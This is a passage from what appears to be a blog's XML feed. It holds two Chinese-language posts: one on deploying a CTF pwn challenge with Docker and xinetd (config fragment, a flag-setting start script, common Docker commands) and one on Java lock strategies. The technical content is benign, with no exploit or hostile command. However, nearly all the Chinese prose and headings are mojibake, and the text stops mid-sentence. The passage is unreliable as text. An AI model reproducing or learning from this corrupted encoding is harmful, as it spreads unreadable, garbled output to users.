  per_source= 10 # the maximum instances of this service per source IP address</span><br><span class="line">    rlimit_cpu= 20 # the maximum number of CPU seconds that the service may use</span><br><span class="line">    #rlimit_as  = 1024M # the Address Space resource limit for the service</span><br><span class="line">    #access_times = 2:00-9:00 12:00-24:00</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>.&#x2F;+è‡ªå·±ç¼–è¯‘å¥½çš„ELFæ–‡ä»¶</strong><br>å¦‚æœæ¶‰åŠåˆ°å †çš„é¢˜ç›® ä¿®æ”¹Dockerfileè‡³ä¸çº¢æ¡†å†…å®¹ä¸€è‡´.(18.04ä»¥ä¸Šçš„éƒ½å’Œè¿™ä¸ªä¿æŒä¸€è‡´)</p><p><img src="/../imgs/2024-10/image-20241107234628376.png" alt="image-20241107234628376"></p><p><strong>start.shæ–‡ä»¶</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"># Add your startup script</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="string">sed</span> <span class="string">-i</span> <span class="string">&quot;s/cdusec&#123;pwntestflag&#125;/$FLAG/&quot;</span> <span class="string">/home/ctf/flag</span></span><br><span class="line"><span class="string">export</span> <span class="string">FLAG=&quot;&quot;</span></span><br><span class="line"><span class="comment"># DO NOT DELETE</span></span><br><span class="line"><span class="string">/etc/init.d/xinetd</span> <span class="string">start;</span></span><br><span class="line"><span class="string">sleep</span> <span class="string">infinity;</span></span><br></pre></td></tr></table></figure><h4 id="æœ¬åœ°æµ‹è¯•"><a href="#æœ¬åœ°æµ‹è¯•" class="headerlink" title="æœ¬åœ°æµ‹è¯•"></a>æœ¬åœ°æµ‹è¯•</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p &quot;127.0.0.1:8888:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</span><br></pre></td></tr></table></figure><p>-påé¢çš„å†…å®¹å°±æ˜¯æŠŠ9999ç«¯å£æ˜ å°„åˆ°8888ç«¯å£ï¼ˆå¯æ”¹ï¼‰<br>â€“nameåé¢çš„å†…å®¹æ˜¯æŒ‡å®š<a href="https://cloud.tencent.com/product/tke?from=10680">å®¹å™¨</a>çš„åç§°ï¼Œè€Œ-hæ˜¯æŒ‡å®šå®¹å™¨çš„hostnameï¼Œè€Œæœ€åçš„æ˜¯imageçš„åå­—ï¼Œè¦æ ¹æ®å»ºçš„é•œåƒåè¿›è¡Œä¿®æ”¹.</p><p><strong>éƒ¨ç½²å‚è€ƒæ–‡ç« </strong>ï¼š<a href="https://blog.csdn.net/qq_52820087/article/details/127851116">webå’Œpwné¢˜çš„ç®€å•åŠ¨æ€flagå®ç°_gzctf-CSDNåšå®¢</a></p><h3 id="å®ç”¨çš„å‘½ä»¤"><a href="#å®ç”¨çš„å‘½ä»¤" class="headerlink" title="å®ç”¨çš„å‘½ä»¤"></a>å®ç”¨çš„å‘½ä»¤</h3><p>Youâ€™re masterï¼</p><h5 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">æˆ‘çš„ç³»ç»Ÿç¯å¢ƒï¼šUbuntu 22.04</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ›´æ–°è½¯ä»¶åŒ…</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®‰è£…docker</span></span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ£€æŸ¥dockeræ˜¯å¦å®‰è£…æˆåŠŸ</span></span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><h5 id="åˆ¶ä½œé•œåƒå¹¶ä¸Šä¼ "><a href="#åˆ¶ä½œé•œåƒå¹¶ä¸Šä¼ " class="headerlink" title="åˆ¶ä½œé•œåƒå¹¶ä¸Šä¼ "></a>åˆ¶ä½œé•œåƒå¹¶ä¸Šä¼ </h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t &quot;pwn&quot; .</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„åé¢çš„ .</strong></p><h5 id="æŸ¥çœ‹æœ¬æœºæ‰€æœ‰é•œåƒ"><a href="#æŸ¥çœ‹æœ¬æœºæ‰€æœ‰é•œåƒ" class="headerlink" title="æŸ¥çœ‹æœ¬æœºæ‰€æœ‰é•œåƒ"></a>æŸ¥çœ‹æœ¬æœºæ‰€æœ‰é•œåƒ</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h5 id="è¿è¡Œå®¹å™¨"><a href="#è¿è¡Œå®¹å™¨" class="headerlink" title="è¿è¡Œå®¹å™¨"></a>è¿è¡Œå®¹å™¨</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run</span><br></pre></td></tr></table></figure><h5 id="åœæ­¢å®¹å™¨"><a href="#åœæ­¢å®¹å™¨" class="headerlink" title="åœæ­¢å®¹å™¨"></a>åœæ­¢å®¹å™¨</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop</span><br></pre></td></tr></table></figure><h5 id="å¼ºåˆ¶åœæ­¢å®¹å™¨"><a href="#å¼ºåˆ¶åœæ­¢å®¹å™¨" class="headerlink" title="å¼ºåˆ¶åœæ­¢å®¹å™¨"></a>å¼ºåˆ¶åœæ­¢å®¹å™¨</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker kill </span><br></pre></td></tr></table></figure><h5 id="åˆ é™¤å®¹å™¨"><a href="#åˆ é™¤å®¹å™¨" class="headerlink" title="åˆ é™¤å®¹å™¨"></a>åˆ é™¤å®¹å™¨</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm</span><br></pre></td></tr></table></figure><h5 id="å¼ºåˆ¶åˆ é™¤é•œåƒ"><a href="#å¼ºåˆ¶åˆ é™¤é•œåƒ" class="headerlink" title="å¼ºåˆ¶åˆ é™¤é•œåƒ"></a>å¼ºåˆ¶åˆ é™¤é•œåƒ</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><h5 id="åˆ é™¤æ‰€æœ‰æœªè¢«ä½¿ç”¨çš„é•œåƒ"><a href="#åˆ é™¤æ‰€æœ‰æœªè¢«ä½¿ç”¨çš„é•œåƒ" class="headerlink" title="åˆ é™¤æ‰€æœ‰æœªè¢«ä½¿ç”¨çš„é•œåƒ"></a>åˆ é™¤æ‰€æœ‰æœªè¢«ä½¿ç”¨çš„é•œåƒ</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker image prune -a</span><br></pre></td></tr></table></figure><h5 id="åˆ é™¤æ‰€æœ‰é•œåƒ"><a href="#åˆ é™¤æ‰€æœ‰é•œåƒ" class="headerlink" title="åˆ é™¤æ‰€æœ‰é•œåƒ"></a>åˆ é™¤æ‰€æœ‰é•œåƒ</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f $(docker images -q)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤ä¼šåˆ é™¤åŒ…æ‹¬ <code>&lt;none&gt;</code> æ ‡ç­¾åœ¨å†…çš„æ‰€æœ‰é•œåƒ.<br>å…¶ä¸­ä¸¤ä¸ªå…·ä½“ä»€ä¹ˆæ„æ€å…¶å®ä¹Ÿå¯ä»¥çŒœå‡ºæ¥ï¼Œæä¸èµ¢ä¹Ÿå¯ä»¥å»STFW.</p><h5 id="è¿›å…¥-Docker-å®¹å™¨ä»¥æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹"><a href="#è¿›å…¥-Docker-å®¹å™¨ä»¥æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹" class="headerlink" title="è¿›å…¥ Docker å®¹å™¨ä»¥æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹"></a>è¿›å…¥ Docker å®¹å™¨ä»¥æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it &lt;CONTAINER_ID&gt; /bin/bash</span><br></pre></td></tr></table></figure><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>æ“ä½œä¸­ç‰¹åˆ«æ³¨æ„æƒé™é—®é¢˜ï¼ˆææƒå’Œå¯777ï¼‰,ä»¥åŠé¢„ç•™å¤Ÿè¶³å¤Ÿçš„ç©ºé—´.<br>ä¸Šä¼ åˆ°å¹³å°ä¸€å®šè¦è¿›è¡Œå¥½æµ‹è¯•.</p>]]></content>
      
      
      <categories>
          
          <category> ç¢ç‰‡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x9_</title>
      <link href="/2024/09/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B9%9D/"/>
      <url>/2024/09/11/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B9%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡ä¹"><a href="#å¤šçº¿ç¨‹ç¯‡ä¹" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡ä¹"></a>å¤šçº¿ç¨‹ç¯‡ä¹</h3><h4 id="å¸¸è§çš„é”ç­–ç•¥"><a href="#å¸¸è§çš„é”ç­–ç•¥" class="headerlink" title="å¸¸è§çš„é”ç­–ç•¥"></a>å¸¸è§çš„é”ç­–ç•¥</h4><p>è™½ç„¶æˆ‘ä»¬å¼€å‘è€…ä¸€èˆ¬åªå…³æ³¨å¦‚ä½•ä½¿ç”¨é”ï¼Œä½†è®¾è®¡é”æˆ‘ä»¬ä¹Ÿéœ€è¦æœ‰ä¸€å®šçš„äº†è§£.</p><h5 id="ä¹è§‚é”å’Œæ‚²è§‚é”"><a href="#ä¹è§‚é”å’Œæ‚²è§‚é”" class="headerlink" title="ä¹è§‚é”å’Œæ‚²è§‚é”"></a>ä¹è§‚é”å’Œæ‚²è§‚é”</h5><p>é¡¾åæ€ä¹‰ï¼Œä¸¤ä¸ªé”ä¸€ä¸ªæ˜¯è€ƒè™‘çš„æœ€ä¼˜æƒ…å†µä¸€ä¸ªè€ƒè™‘æœ€åæƒ…å†µ.</p><h6 id="ä¹è§‚é”"><a href="#ä¹è§‚é”" class="headerlink" title="ä¹è§‚é”"></a>ä¹è§‚é”</h6><p>åœ¨åŠ é”ä¹‹å‰ï¼Œå‡è®¾æ•°æ®ä¸€èˆ¬æƒ…å†µä¸‹ä¸ä¼šäº§ç”Ÿå†²çªï¼Œåªåœ¨æ•°æ®è¿›è¡Œè¿”å›æ›´æ–°çš„æ—¶å€™è¿›è¡Œæ£€æŸ¥æ ¡éªŒï¼Œå¦‚æœå‘ç”Ÿå¹¶è¡Œå†²çªå°±è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œè®©ç”¨æˆ·é‡æ–°è¿›è¡Œå†³ç­–.ï¼ˆå°±æ˜¯åŠ é”ä¹‹å‰é¢„ä¼°å‡ºç°æ‰€å†²çªçš„æ¦‚ç‡ä¸å¤§æ‰€ä»¥åœ¨åŠ é”å‰ä¸ä¼šè¿›è¡Œå¤ªå¤šçš„å·¥ä½œã€åŠ é”è¿‡ç¨‹åšçš„äº‹å°‘åŠ é”çš„é€Ÿåº¦æ›´å¿«ä½†æ˜¯æ›´å®¹æ˜“å¼•å…¥ä¸€äº›å…¶ä»–é—®é¢˜æ¶ˆè€—CPUèµ„æºã€‘ï¼‰<br>æ¯”å¦‚ä½ æƒ³åƒé¥­ï¼Œä½†æ˜¯é£Ÿå ‚è¿™ä¸ªæ—¶å€™è¢«å†›çˆ·å é¢†äº†ï¼Œä½ è§‰å¾—ä½ å»çš„è¿‡å¤Ÿæ—©å†›çˆ·æŠ¢ä¸è¿‡ä½ ï¼Œç›´æ¥å†²å»é£Ÿå ‚ï¼Œç»“æœæ’ä¸Šäº†é•¿é•¿çš„é˜Ÿä¼.ã€æ²¡åŠ é”ä½†èƒ½è¯†åˆ«æ•°æ®å†²çªã€‘</p><h6 id="æ‚²è§‚é”"><a href="#æ‚²è§‚é”" class="headerlink" title="æ‚²è§‚é”"></a>æ‚²è§‚é”</h6><p>åœ¨åŠ é”ä¹‹å‰ï¼Œæ€»å‡è®¾æ•°æ®ä»ä¸€å¼€å§‹å°±å®¹æ˜“è¢«ä¿®æ”¹ï¼Œæ¯æ¬¡æ‹¿æ•°æ®çš„æ—¶å€™å°±ä¼šåŠ é”.æƒ³æ‹¿åˆ°è¿™ä¸ªæ•°æ®åªèƒ½ç­‰å¾…é˜»å¡æ‹¿åˆ°é”.ï¼ˆåœ¨åŠ é”ä¹‹å‰é¢„ä¼°å‡ºç°é”å†²çªçš„æ¦‚ç‡å¾ˆå¤§ï¼ŒåŠ é”çš„æ—¶å€™ä¼šåšæ›´å¤šçš„å·¥ä½œé˜²æ­¢æ„å¤–ï¼Œæ­¤æ—¶åŠ é”çš„é€Ÿåº¦å¯èƒ½æ›´æ…¢ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹ä¸­æ›´ä¸å®¹æ˜“å‡ºç°å…¶ä»–é—®é¢˜ï¼‰<br>å’Œä¸Šè¿°åŒæ ·çš„æƒ…å†µï¼Œä¸ºäº†é˜²æ­¢ç©ºè·‘ä¸€è¶Ÿä½ ç»™å¯é¢„å®šçª—å£å‘æ¶ˆæ¯è¯¢é—®èƒ½å¦é¢„å®šï¼ˆç›¸å½“äºåŠ é”ï¼‰å¾—åˆ°è‚¯å®šç­”å¤ä¹‹åä¼šæ¥å–é¤å¦‚æœç”Ÿæ„å¤ªç«çˆ†æ²¡å›æˆ–è€…è¯´ä¸å¤Ÿé¢„å®šçš„å°±ä¸‹æ¬¡å†å»è¿™ä¸ªçª—å£.</p><p><strong>Synchronizedåˆå§‹ä½¿ç”¨ä¹è§‚é”ç­–ç•¥.å½“å‘ç°é”ç«äº‰æ¯”è¾ƒé¢‘ç¹çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨åˆ‡æ¢æˆæ‚²è§‚é”ç­–ç•¥.</strong><br>å½“ç„¶è¿™ç§ç›¸äº’ç»“åˆçš„æ¨¡å¼åœ¨å®é™…åº”ç”¨ä¸­æ›´å…·é«˜æ•ˆæ€§.</p><h5 id="é‡é‡çº§é”å’Œè½»é‡çº§é”"><a href="#é‡é‡çº§é”å’Œè½»é‡çº§é”" class="headerlink" title="é‡é‡çº§é”å’Œè½»é‡çº§é”"></a>é‡é‡çº§é”å’Œè½»é‡çº§é”</h5><p>é”çš„æ ¸å¿ƒç‰¹æ€§â€”â€”  â€œåŸå­æ€§â€è¿™æ ·çš„æœºåˆ¶è¿½æº¯æ ¹æºæ˜¯CPUè¿™æ ·çš„ç¡¬ä»¶è®¾å¤‡æä¾›çš„.<br>CPUæä¾›äº†â€åŸå­æ“ä½œæŒ‡ä»¤â€<br>æ“ä½œç³»ç»ŸåŸºäºCPUåŸå­æŒ‡ä»¤ï¼Œå®ç°äº†mutexäº’æ–¥é”.<br>JVMåŸºäºOSæä¾›çš„äº’æ–¥é”ï¼Œå®ç°äº†synchronizedå’ŒReentrankLockç­‰å…³é”®å­—å’Œç±».<br>1</p><h6 id="é‡é‡çº§é”"><a href="#é‡é‡çº§é”" class="headerlink" title="é‡é‡çº§é”"></a>é‡é‡çº§é”</h6><p>é€‚ç”¨äºé”é«˜ç«äº‰çš„åœºæ™¯.ã€å¼€é”€è¾ƒé«˜ã€‘<br>åŠ é”å¼€é”€æ›´å¤§ï¼ŒåŠ é”é€Ÿåº¦æ›´æ…¢.</p><p>åŠ é”æœºåˆ¶é‡åº¦ä¾èµ–äº†OSæä¾›çš„mutex.<br>å¤§é‡çš„å†…æ ¸æ€ç”¨æˆ·æ€åˆ‡æ¢.<br>å¾ˆå®¹æ˜“å¼•å‘çº¿ç¨‹çš„è°ƒåº¦.<br><strong>æ¶‰åŠç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„åˆ‡æ¢æˆæœ¬é«˜é«˜é«˜é«˜</strong></p><h6 id="è½»é‡çº§é”"><a href="#è½»é‡çº§é”" class="headerlink" title="è½»é‡çº§é”"></a>è½»é‡çº§é”</h6><p>åŸºäºCASæ“ä½œçš„é”å®ç°ï¼Œé€‚ç”¨äºä½ç«äº‰åœºæ™¯ï¼›å¯ä»¥é¿å…é˜»å¡ï¼Œä½†åœ¨ç«äº‰æ¿€çƒˆæ—¶ä¼šè†¨èƒ€ä¸ºé‡é‡çº§é”.</p><p>åŠ é”æœºåˆ¶å°½å¯èƒ½ä¸ä½¿ç”¨mutexå°½é‡åœ¨ç”¨æˆ·æ€ä»£ç å®Œæˆ.æä¸èµ¢å†ç”¨mutex.</p><p>å°‘é‡çš„å†…æ ¸æ€ç”¨æˆ·æ€åˆ‡æ¢.<br>ä¸æ€å®¹æ˜“å¼•å‘çº¿ç¨‹è°ƒåº¦.<br><strong>synchronizedå¼€å§‹æ—¶æ˜¯ä¸€ä¸ªè½»é‡çº§é”ï¼Œå¦‚æœé”å†²çªæ¯”è¾ƒä¸¥é‡å°±ä¼šå˜æˆé‡é‡çº§é”.</strong><br>åŠ é”å¼€é”€æ›´å°ï¼ŒåŠ é”é€Ÿåº¦æ›´å¿«.</p><h6 id="æŒ‚èµ·ç­‰å¾…é”"><a href="#æŒ‚èµ·ç­‰å¾…é”" class="headerlink" title="æŒ‚èµ·ç­‰å¾…é”"></a><strong>æŒ‚èµ·ç­‰å¾…é”</strong></h6><p> ä¸€ç§é‡é‡çº§é”çš„å…¸å‹ä¾‹å­åŒæ—¶ä¹Ÿæ˜¯ä¸€ç§æ‚²è§‚é”.<br>è¿›è¡ŒæŒ‚èµ·ç­‰å¾…çš„æ—¶å€™éœ€è¦å†…æ ¸è°ƒåº¦å™¨æ¥å…¥ã€æ­¤æ—¶éœ€è¦çš„æ“ä½œå˜å¤šã€‘çœŸæ­£è·å–åˆ°é”è€—è´¹çš„æ—¶é—´è‡ªç„¶å¢é•¿.<br><strong>é€‚ç”¨é”ç«äº‰æ¿€çƒˆçš„æƒ…å†µ.</strong></p><h6 id="è‡ªæ—‹é”"><a href="#è‡ªæ—‹é”" class="headerlink" title="è‡ªæ—‹é”"></a><strong>è‡ªæ—‹é”</strong></h6><p>ä¸€ç§è½»é‡çº§é”çš„å®ç°åŒæ—¶ä¹Ÿæ˜¯ä¸€ç§ä¹è§‚é”.<br>è¿›è¡ŒåŠ é”çš„æ—¶å€™æ­é…whileå¾ªç¯ï¼Œå¦‚æœåŠ é”æˆåŠŸï¼Œç»“æŸå¾ªç¯.åä¹‹å†æ¬¡è¿›è¡Œå¾ªç¯ä¸æ”¾å¼ƒï¼Œå†æ¬¡å°è¯•è·å–åˆ°é”.ï¼ˆåšå¼ºåŠ±å¿—!ï¼‰<br>è¿™ä¸ªåå¤æ‰§è¡Œçš„è¿‡ç¨‹å°±ç§°ä¸ºâ€è‡ªæ—‹â€.ä¸€æ—¦å…¶ä»–çº¿ç¨‹é‡Šæ”¾äº†é”å°±èƒ½ç«‹é©¬æ‹¿åˆ°é”ï¼ˆèˆ”çš„æ¼‚äº®!bushiï¼‰<br><strong>ä½¿ç”¨å‰ææ˜¯é¢„æœŸé”å†²çªä¸å¤§ï¼Œå…¶ä»–çº¿ç¨‹é‡Šæ”¾äº†é”ä¸ç„¶æ­»æ­»å¾ªç¯å¤ªè€—è´¹CPU</strong><br><strong>synchronized ä¸­çš„è½»é‡çº§é”ç­–ç•¥â¼¤æ¦‚ç‡å°±æ˜¯é€šè¿‡â¾ƒæ—‹é”çš„â½…å¼å®ç°.</strong></p><p><strong>æ‚²è§‚ä¹è§‚æ˜¯åŠ é”ä¹‹å‰å¯¹æœªå‘ç”Ÿçš„äº‹æƒ…è¿›è¡Œçš„è¯„ä¼°.</strong><br><strong>è½»é‡é‡çº§æ˜¯åŠ é”ä¹‹åå¯¹ç»“æœçš„è¯„ä»·.</strong><br><u>synchronizedæ˜¯èƒ½è‡ªé€‚åº”çš„é”ï¼Œæ ¹æ®é”å†²çªçš„æ¦‚ç‡é«˜è¿˜æ˜¯ä½å®ç°é”æ¨¡å¼çš„åˆ‡æ¢</u></p><h5 id="å…¬å¹³é”éå…¬å¹³é”"><a href="#å…¬å¹³é”éå…¬å¹³é”" class="headerlink" title="å…¬å¹³é”éå…¬å¹³é”"></a>å…¬å¹³é”éå…¬å¹³é”</h5><p>å’Œâ€çº¿ç¨‹é¥¿æ­»â€æœ‰å…³ï¼Œå…¬å¹³æŒ‡çš„æ˜¯å…ˆæ¥åæ”¾åˆ°.<br>æœ‰Aã€Bã€Cä¸‰ä¸ªçº¿ç¨‹.Aå…ˆå°è¯•è·å–é”ç„¶åè·å–æˆåŠŸï¼ŒBæ­¤æ—¶å¼€å§‹å°è¯•è·å–é”ï¼Œè·å–å¤±è´¥é˜»å¡ç­‰å¾…ï¼Œç„¶åCä¹Ÿå°è¯•è·å–é”ï¼Œä»ç„¶é˜»å¡ç­‰å¾….<br><strong>ä¸¤è€…æ²¡æœ‰å¥½åä¹‹åˆ†ï¼Œå…³é”®çœ‹ä½¿ç”¨åœºæ™¯</strong></p><h6 id="å…¬å¹³é”"><a href="#å…¬å¹³é”" class="headerlink" title="å…¬å¹³é”"></a>å…¬å¹³é”</h6><p>éµå®ˆâ€å…ˆæ¥ååˆ°â€.Aé‡Šæ”¾é”ä¹‹åBå…ˆå¾—åˆ°é”ï¼ŒæŠŠCæ™¾åœ¨ä¸€è¾¹.</p><h6 id="éå…¬å¹³é”"><a href="#éå…¬å¹³é”" class="headerlink" title="éå…¬å¹³é”"></a>éå…¬å¹³é”</h6><p>ä¸éµå®ˆâ€å…ˆæ¥ååˆ°â€.Bå’ŒCå…¬å¹³ç«äº‰,ä¸¤è€…éƒ½æœ‰å¯èƒ½è·å–åˆ°é”.<br><strong>synchronizedæ˜¯éå…¬å¹³é”.</strong></p><p><strong>ç«™åœ¨ç³»ç»ŸåŸç”Ÿé”çš„è§’åº¦é”æ˜¯éå…¬å¹³çš„ã€æ“çºµç³»ç»Ÿå†…éƒ¨çš„çº¿ç¨‹è°ƒåº¦å°±æ˜¯å¯ä»¥è§†ä¸ºæ˜¯éšæœºçš„ æƒ³å®ç°å…¬å¹³é”éœ€è¦å¼•å…¥é¢å¤–çš„æ•°æ®ç»“æ„(å¼•å…¥é˜Ÿåˆ—è®°å½•æ¯ä¸ªçº¿ç¨‹å…ˆåé¡ºåº)ã€‘</strong></p><h5 id="å¯é‡å…¥é”å’Œä¸å¯é‡å…¥é”"><a href="#å¯é‡å…¥é”å’Œä¸å¯é‡å…¥é”" class="headerlink" title="å¯é‡å…¥é”å’Œä¸å¯é‡å…¥é”"></a>å¯é‡å…¥é”å’Œä¸å¯é‡å…¥é”</h5><h6 id="å¯é‡å…¥é”"><a href="#å¯é‡å…¥é”" class="headerlink" title="å¯é‡å…¥é”"></a>å¯é‡å…¥é”</h6><p>é¡¾åæ€ä¹‰ï¼Œâ€å¯ä»¥é‡æ–°è¿›å…¥çš„é”â€ï¼Œå…è®¸åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å–åŒä¸€æŠŠé”.<br>ä¸€ä¸ªçº¿ç¨‹é’ˆå¯¹ä¸€æŠŠé”å¯ä»¥è¿ç»­åŠ é”ä¸¤æ¬¡ä¸ä¼šæ­»é”å³æ˜¯å¯é‡å…¥é”.</p><h6 id="ä¸å¯é‡å…¥é”"><a href="#ä¸å¯é‡å…¥é”" class="headerlink" title="ä¸å¯é‡å…¥é”"></a>ä¸å¯é‡å…¥é”</h6><p>è·Ÿä¸Šè¿°æƒ…å†µç›¸å.ç¬¬äºŒæ¬¡åŠ é”çš„æ—¶å€™ä¼šé˜»å¡ç­‰å¾…ç›´åˆ°ç¬¬ä¸€ä¸ªé”é‡Šæ”¾ï¼Œæ‰ä¼šè·å–åˆ°ç¬¬äºŒä¸ªé”.ä½†æ˜¯è¯¥çº¿ç¨‹æ‘†äº†ä»€ä¹ˆä¹Ÿä¸æƒ³å¹²ï¼Œæ­¤æ—¶å°±ä¼šæ­»é”.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¬¬â¼€æ¬¡åŠ é”, åŠ é”æˆåŠŸ</span></span><br><span class="line">lock();</span><br><span class="line"><span class="comment">// ç¬¬â¼†æ¬¡åŠ é”, é”å·²ç»è¢«å â½¤, é˜»å¡ç­‰å¾…. </span></span><br><span class="line">lock();</span><br></pre></td></tr></table></figure><p><strong>Linuxæä¾›çš„mutexæ˜¯ä¸å¯é‡å…¥é”</strong><br><strong>synchronizedæ˜¯å¯é‡å…¥é”.</strong></p><p><strong>Javaâ¾¥åªè¦ä»¥Reentrantå¼€å¤´å‘½åçš„é”éƒ½æ˜¯å¯é‡â¼Šé”ï¼Œ</strong>â½½ä¸”JDKæä¾›çš„æ‰€æœ‰ç°æˆçš„Lockå®ç°ç±».</p><h5 id="æ™®é€šäº’æ–¥é”è¯»å†™é”"><a href="#æ™®é€šäº’æ–¥é”è¯»å†™é”" class="headerlink" title="æ™®é€šäº’æ–¥é”è¯»å†™é”"></a>æ™®é€šäº’æ–¥é”è¯»å†™é”</h5><h6 id="æ™®é€šäº’æ–¥é”"><a href="#æ™®é€šäº’æ–¥é”" class="headerlink" title="æ™®é€šäº’æ–¥é”"></a>æ™®é€šäº’æ–¥é”</h6><p>ç±»ä¼¼synchronizedæ“ä½œæ¶‰åŠåˆ°çš„åŠ é”å’Œè§£é”.</p><h6 id="è¯»å†™é”"><a href="#è¯»å†™é”" class="headerlink" title="è¯»å†™é”"></a>è¯»å†™é”</h6><p>å¤šçº¿ç¨‹ä¹‹é—´ï¼Œæ•°æ®çš„è¯»å–â½…ä¹‹é—´ä¸ä¼šäº§â½£çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œä½†æ•°æ®çš„å†™â¼Šâ½…äº’ç›¸ä¹‹é—´ä»¥åŠå’Œè¯»è€…ä¹‹é—´éƒ½ éœ€è¦è¿›â¾äº’æ–¥ã€‚å¦‚æœä¸¤ç§åœºæ™¯ä¸‹éƒ½â½¤åŒâ¼€ä¸ªé”ï¼Œå°±ä¼šäº§â½£æâ¼¤çš„æ€§èƒ½æŸè€—ã€‚æ‰€ä»¥è¯»å†™é”å› æ­¤â½½äº§â½£.</p><p>1ï¼‰åŠ è¯»é”<br>2ï¼‰åŠ å†™é”<br><strong>è¯»é”å’Œè¯»é”ä¹‹é—´ä¸ä¼šäº§ç”Ÿå†²çªï¼ˆä¸ä¼šé˜»å¡ï¼‰</strong><br><strong>å†™é”å’Œå†™é”ä¹‹é—´ä¼šäº§ç”Ÿé”å†²çªï¼ˆä¼šé˜»å¡ï¼‰</strong><br><strong>è¯»é”å’Œå†™é”ä¹‹é—´ä¼šå‡ºç°é”å†²çªï¼ˆä¼šé˜»å¡ï¼‰</strong></p><p>ä¸€ä¸ªçº¿ç¨‹åŠ è¯»é”çš„æ—¶å€™å¦ä¸€ä¸ªçº¿ç¨‹åªèƒ½è¯»ä¸èƒ½å†™.<br>ä¸€ä¸ªçº¿ç¨‹åŠ å†™é”çš„æ—¶å€™å¦ä¸€ä¸ªçº¿ç¨‹ä¸èƒ½å†™ä¹Ÿä¸èƒ½è¯».</p><p><strong>synchronizedä¸æ˜¯è¯»å†™é”.</strong></p><h6 id="å¼•å…¥è¯»å†™é”åŸå› "><a href="#å¼•å…¥è¯»å†™é”åŸå› " class="headerlink" title="å¼•å…¥è¯»å†™é”åŸå› "></a>å¼•å…¥è¯»å†™é”åŸå› </h6><p>å¦‚æœæ˜¯ä¸¤ä¸ªçº¿ç¨‹åœ¨è¯»é‚£çº¿ç¨‹æœ¬èº«å°±æ˜¯å®‰å…¨çš„ä¸éœ€è¦äº’æ–¥.<br>å¦‚æœä½¿ç”¨synchronizedè¿™ç§æ–¹å¼åŠ 